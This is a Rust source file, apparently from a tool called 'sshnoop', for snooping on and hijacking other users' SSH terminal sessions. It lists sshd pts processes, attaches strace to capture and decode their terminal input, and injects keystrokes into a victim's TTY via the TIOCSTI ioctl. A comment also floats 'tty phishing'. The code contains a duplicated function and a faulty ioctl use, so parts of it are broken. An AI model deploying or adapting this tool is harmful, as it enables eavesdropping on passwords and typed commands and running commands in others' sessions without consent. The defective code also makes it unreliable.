use getch_rs::{Getch, Key};
use nix::libc::{ioctl, TIOCSTI};
use libc::TIOCGPTN;
use procfs::process::{self, Process};
use regex::Regex;
use std::io::Write;
use std::io::{self, BufRead, BufReader};
use std::os::fd::AsRawFd;
use std::process::{Command, Stdio};
use std::str::FromStr;

pub fn read(pid: &str) {
    println!("Attaching reader to {pid}");

    let mut child = Command::new("strace")
        .args(["-xx", "-s", "16384", "-p", &pid, "-e", "read"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to start strace command");

    let fd = fd_of_sshd_pts(pid).unwrap();

    let stderr = child.stderr.take().expect("Failed to capture stderr");

    let mut reader = BufReader::new(stderr);

    let re = Regex::new(&format!(r#"(?mU)read\({}, "(.*)""#, fd)).unwrap();

    loop {
        let mut buf = String::new();
        let _ = reader.read_line(&mut buf);
        buf = buf.replace("\\x", "");

        if let Some(caps) = re.captures(&buf) {
            if let Some(mat) = caps.get(1) {
                let decoded_hex = hex::decode(mat.as_str()).expect("Failed to decode");
                io::stdout().write_all(&decoded_hex).expect("Pipe died");
                io::stdout().flush().unwrap();
            }
        }

        if let Ok(Some(_status)) = child.try_wait() {
            println!("Connection closed");
            break;
        }
    }
}

/// Given the pid of an sshd process, return the tty
/// This only works for sshd because they expose the tty in the cmdline
pub fn tty_of_sshd(pid: &str) -> Result<String, std::io::Error> {
    let cmdline = std::fs::read_to_string(format!("/proc/{pid}/cmdline"))?;

    // format: /path/to/sshd: user@tty
    let parts: Vec<&str> = cmdline.split('@').collect();

    if parts.len() != 2 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "Invalid cmdline",
        ));
    }

    // prepend /dev/ to tty, trim '\0' and return
    Ok(format!("/dev/{}", parts[1].trim_end_matches('\0')))
}

pub fn get_pts_user(pid: &str) -> Result<String, std::io::Error> {
    let cmdline = std::fs::read_to_string(format!("/proc/{pid}/cmdline"))?;

    // format: /path/to/sshd: user@tty
    let parts: Vec<&str> = cmdline.split('@').collect();

    if parts.len() != 2 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "Invalid cmdline",
        ));
    }
    Ok(String::from_str(parts[0].split(": ").nth(1).expect("Unreachable")).unwrap())
}

/// Takes a PID and writes to the stdin of the process
pub fn write(pid: &str) {
    let tty = &tty_of_sshd(pid).expect("Failed to get TTY");
    println!("Attaching writer to {}", tty);

    let input = Getch::new();

    loop {
        match input.getch() {
            Ok(Key::Ctrl('p')) => continue, // TODO: tty phishing?
            Ok(Key::Ctrl('z')) => break,
            Ok(Key::Ctrl('d')) => break,
            Ok(Key::Delete) => {
                // This is actually backspace but the crate we are using is cooked
                write_str(tty, "\x08\x1b\x5b\x4b");
            }
            Ok(Key::Ctrl('c')) => write_str(tty, "\x03"),
            Ok(Key::Char(c)) => {
                write_str(tty, &c.to_string());
            }
            _ => {}
        }
    }
}

/// This function assumes that the fd we want is the second one, cause that is what has worked
/// in whitebox testing
fn fd_of_sshd_pts(pid: &str) -> Result<i32, std::io::Error> {
    let entries = std::fs::read_dir(format!("/proc/{}/fd", pid))?;

    let mut fds: Vec<i32> = entries
        .map(|res| res.unwrap())
        .filter_map(|entry| {
            let path = entry.path();
            let link = std::fs::read_link(&path).expect("Failed to read link");
            if link == std::path::Path::new("/dev/ptmx") {
                let filename = path.file_name().unwrap();
                let fd: i32 = filename.to_string_lossy().parse::<i32>().unwrap();
                return Some(fd);
            }
            None
        })
        .collect();

    fds.sort();
    Ok(fds[1])
}

/// Writes char to the specified TTY using IOCTL
fn write_char(tty: &str, c: u8) {
    let file = std::fs::OpenOptions::new()
        .write(true)
        .open(tty)
        .expect("Failed to open tty"); // TODO: Don't panic when connection closes.

    let fd = file.as_raw_fd();

    unsafe {
        ioctl(fd, TIOCSTI, &c as *const _ as *const i8);
    }
}

fn write_str(tty: &str, s: &str) {
    s.bytes().for_each(|c| write_char(tty, c))
}

pub fn get_options() -> Vec<Process> {
    let all_processes: Vec<Process> = process::all_processes()
        .expect("Can't read /proc")
        .filter_map(|p| match p {
            Ok(p) => Some(p), // happy path
            Err(e) => match e {
                procfs::ProcError::NotFound(_) => None, // process vanished during iteration, ignore it
                procfs::ProcError::Io(_, _) => None, // can match on path to decide if we can continue
                x => {
                    println!("Can't read process due to error {x:?}"); // some unknown error
                    None
                }
            },
        })
        .collect();

    let re = Regex::new(r#"^sshd: (.+)@(pts/[0-9])"#).unwrap();

    let mut pts_processes: Vec<Process> = Vec::new();

    for proc in all_processes {
        if let Ok(cmd) = proc.cmdline() {
            if cmd.len() == 1 && re.is_match(&cmd[0]) {
                // Find all sshd pts processes
                let pid = proc.stat().unwrap().pid;

                if let Ok(p) = Process::new(pid) {
                    pts_processes.push(p)
                }
            }
        }
    }

    // Don't want to bother with out own tty, so we will find and remove it
    // Need to recurse up tree to find a process in our list.
    if let Some(sshd_pid) = find_sshd_parent(Process::myself().unwrap().stat().unwrap().pid) {
        pts_processes.retain(|p| p.pid != sshd_pid);
    }
    pts_processes
}

/// Returns id of the process that is the sshd pts parent of the sshnoop process\
// Or returns None if sshnoop isn't a child of sshd.
fn find_sshd_parent(pid: i32) -> Option<i32> {
    if let Ok(process) = Process::new(pid) {
        let comm = process.stat().unwrap().comm;

        if comm == "sshd" {
            return Some(pid);
        }

        if let Ok(stat) = process.stat() {
            return find_sshd_parent(stat.ppid);
        }
    }
    None
}

fn fd_of_sshd_pts(pid: &str) -> Result<i32, std::io::Error> {
    // for each file in /proc/{pid}/fd
    // if it's a symlink to /dev/ptmx
    // use ioctl to get the slave pts
    // if the slave pts is the same as the one we got from tty_of_sshd
    // return the fd number
    let mut fd = String::new();
    let pts_desired = tty_of_sshd(pid).expect("Failed to get TTY");
    
    // for each file in /proc/{pid}/fd
    for entry in std::fs::read_dir(format!("/proc/{}/fd", pid))? {
        let entry = entry?;
        let path = entry.path();
        let link = std::fs::read_link(&path).expect("Failed to read link");
        if link == std::path::Path::new("/dev/ptmx") {
            let file = std::fs::OpenOptions::new()
                .read(true)
                .open(&path)
                .expect("Failed to open tty");

            let fd = file.as_raw_fd();
            let mut pts = String::new();
            unsafe {
                ioctl(fd, TIOCGPTN, &mut pts as *mut _ as *mut i32);
            }
            if pts == pts_desired {
                return Ok(fd);
            }
        }
    }
    Err(std::io::Error::new(
        std::io::ErrorKind::InvalidData,
        "Failed to find pts",
    ))
}